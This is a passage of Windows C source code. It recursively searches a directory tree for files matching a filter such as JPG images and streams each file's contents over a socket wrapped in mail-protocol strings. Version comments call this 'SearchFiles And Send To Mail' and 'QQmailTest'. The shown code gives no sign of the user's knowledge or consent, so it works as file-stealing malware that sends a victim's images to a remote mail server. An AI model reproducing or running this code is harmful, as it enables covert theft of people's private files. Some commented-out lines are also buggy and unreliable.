}

void FindJpgFile(LPCTSTR strPath, LPCTSTR  strFilter)
{
	if(strPath == NULL || strFilter == NULL)
	{
		return;
	}
	
	BOOL bRet = TRUE;
	WIN32_FIND_DATA findData;
	TCHAR szFilePath[MAX_PATH] = {0};			// filepath
	//1:Find File
	sprintf(szFilePath, "%s\\%s",strPath, strFilter);
	long handle = (long)::FindFirstFile(szFilePath, &findData);	
	if(handle != 0xFFFFFFFF)
	{
		while(bRet)
		{
			memset(szFilePath, 0x00, MAX_PATH);
			sprintf(szFilePath, "%s\\%s",strPath, findData.cFileName);
			SendFile3(findData.cFileName, szFilePath);
			bRet = FindNextFile((HANDLE)handle, &findData);
		}
		FindClose((HANDLE)handle);
	}
	//2:Find Dir
	bRet = TRUE;
	char* AllFile = "*.*";
	memset(szFilePath, 0x00, MAX_PATH);
	sprintf(szFilePath, "%s\\%s",strPath, AllFile);
	handle = (long)::FindFirstFile(szFilePath, &findData);
	if(handle != 0xFFFFFFFF)
	{
		while(bRet)
		{	
			if(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&(findData.cFileName[0] != '.'))
			{
				memset(szFilePath, 0x00, MAX_PATH);
				sprintf(szFilePath, "%s\\%s",strPath, findData.cFileName);
				FindJpgFile(szFilePath, strFilter);
			}
			bRet = FindNextFile((HANDLE)handle, &findData);
		}
		FindClose((HANDLE)handle);
	}
}
DWORD EncryptBase64(LPTSTR pszBase64, LPCTSTR pszSource, int len);
void SendFile3(LPCTSTR strFileName, LPCTSTR strFilePath)
{
	TCHAR szBufferTemp[MAX_PATH*10] = {0};
	TCHAR szBufferTemp2[MAX_PATH*20] = {0};
	//Send FileName
//  2014.11.17 Ver3.00[QQmailTest] Start
	sprintf(szBufferTemp, DATA_FILE2, strFileName);
//	sprintf(szBufferTemp, DATA_SENDFILE4_ONEBEGIN, strFileName, strFileName);	// .txt
//	sprintf(szBufferTemp, DATA_SENDFILE4_BASE64_ONEBEGIN, strFileName, strFileName);	// .jpg
//  2014.11.17 Ver3.00[QQmailTest] End
	//1: Send Begin
	int nRet = send(server, szBufferTemp, strlen(szBufferTemp), 0);
//	for(int i = 0; i < 1000; i++)
//	{
//		int n = 76;
//		szJPGData[i][n] = '\r';
//		szJPGData[i][n+1] = '\n';
//		nRet = send(server, szJPGData[i], n, 0);
//	}
	//Send Context
	//Send Data
	HANDLE handle = CreateFile(strFilePath, 
		GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(handle != INVALID_HANDLE_VALUE)
	{
		memset(szBufferTemp, 0x0, MAX_PATH*10);
		DWORD nRead = 0;
		BOOL bRet = ReadFile(handle, szBufferTemp, MAX_PATH*10, &nRead, NULL);
		while(bRet && nRead > 0)
		{
			nRet = send(server, szBufferTemp, nRead, 0);
//			memset(szBufferTemp2, 0x0, MAX_PATH*20);
//			DWORD dwRet = EncryptBase64(szBufferTemp2, szBufferTemp, nRead);
//			szBufferTemp2[dwRet] = '\r';
//			szBufferTemp2[dwRet] = '\n';
//			nRet = send(server, szBufferTemp2, dwRet+2, 0);
			memset(szBufferTemp, 0x0, MAX_PATH*10);
			bRet = ReadFile(handle, szBufferTemp, MAX_PATH*10, &nRead, NULL);
		}
		CloseHandle(handle);
	}	
	// Send End
	nRet = send(server, DATA_SENDFILE4_ONEEND, strlen(DATA_SENDFILE4_ONEEND), 0);
}

//  2014.09.26 Ver2.00[SearchFiles And Send To Mail.]] End
int main(int argc, char* argv[])
{
//	MessageBox(0,0,0,0);
//	test();
//  2014.09.26 Ver2.00[SearchFiles And Send To Mail.] Start
	Test4();
//  2014.09.26 Ver2.00[SearchFiles And Send To Mail.] End
	return 0;
}

DWORD EncryptBase64(LPTSTR pszBase64, LPCTSTR pszSource, int len)
{
    if(len <= 0 || pszSource == NULL)   return -1;
    int nCount = 0;
    static BYTE BASE64CODE[] = 
    {
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    };
	
    int nSize = len % 3 == 0 ? len/3 : len/3+1;
    for(int i = 0; i < nSize ; i++)
    {
        BYTE cSrc0,cSrc1,cSrc2;
        BYTE cDest0,cDest1,cDest2,cDest3;
        if(i*3+1 == len)
        {
            cSrc0 = pszSource[i*3];
			
            cDest0 = BASE64CODE[cSrc0 >> 2] ;                          
            cDest1 = BASE64CODE[((cSrc0 & 0x03)<<4)];                 
            cDest2 = '=';
            cDest3 = '=';
        }
        else if(i*3+2 == len)
        {
            cSrc0 = pszSource[i*3];
            cSrc1 = pszSource[i*3+1];
			
            cDest0 = BASE64CODE[cSrc0 >> 2] ;                         
            cDest1 = BASE64CODE[((cSrc0 & 0x03)<<4)|(cSrc1>>4)];      
            cDest2 = BASE64CODE[((cSrc1&0x0F)<<2)];                   
            cDest3 = '=';
        }
        else
        {
            cSrc0 = pszSource[i*3];
            cSrc1 = pszSource[i*3+1];
            cSrc2 = pszSource[i*3+2];   
			
            cDest0 = BASE64CODE[cSrc0 >> 2] ;                         
            cDest1 = BASE64CODE[((cSrc0 & 0x03)<<4)|(cSrc1>>4)];      
            cDest2 = BASE64CODE[((cSrc1&0x0F)<<2)|(cSrc2>>6)];        
            cDest3 = BASE64CODE[(cSrc2 & 0x3f)];                      
        } 
		
        pszBase64[nCount++] = cDest0;
        pszBase64[nCount++] = cDest1;
        pszBase64[nCount++] = cDest2;
        pszBase64[nCount++] = cDest3;
    }
	
	return nCount;
}

